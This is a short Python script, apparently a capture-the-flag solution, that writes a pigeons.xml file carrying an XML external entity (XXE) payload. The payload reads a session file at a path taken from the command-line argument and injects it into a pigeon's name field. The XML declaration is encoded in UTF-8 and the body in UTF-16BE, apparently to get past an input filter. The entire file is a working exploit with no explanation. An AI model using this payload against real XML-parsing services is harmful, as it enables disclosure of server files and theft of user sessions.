import sys

part1 = '<?xml version="1.0" encoding="UTF-16be"'
part2 = f"""?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/ezxxe/app/sessions/{sys.argv[1]}.json">]>
<pigeons>
  <pigeon>
    <name>{"SEE{" + "a" * 60 + "}"}</name>
    <image></image>
    <description></description>
    <website></website>
  </pigeon>
  <pigeon>
    <name>{"SEE{" + "a" * 60 + "}"}{"SEE{" + "a" * 60 + "}"}</name>
    <image></image>
    <description></description>
    <website></website>
  </pigeon>
  <pigeon>
    <name>{"SEE{" + "a" * 60 + "}"}{"SEE{" + "a" * 60 + "}"}{"SEE{" + "a" * 60 + "}"}</name>
    <image></image>
    <description></description>
    <website></website>
  </pigeon>
    <pigeon>
    <name>{"SEE{" + "a" * 60 + "}"}{"SEE{" + "a" * 60 + "}"}{"SEE{" + "a" * 60 + "}"}{"SEE{" + "a" * 60 + "}"}</name>
    <image></image>
    <description></description>
    <website></website>
  </pigeon>
  <pigeon>
    <name>&xxe;</name>
    <image></image>
    <description></description>
    <website></website>
  </pigeon>
</pigeons>
"""

with open("pigeons.xml", "wb") as f:
    f.write(part1.encode('utf-8') + part2.encode("utf-16be"))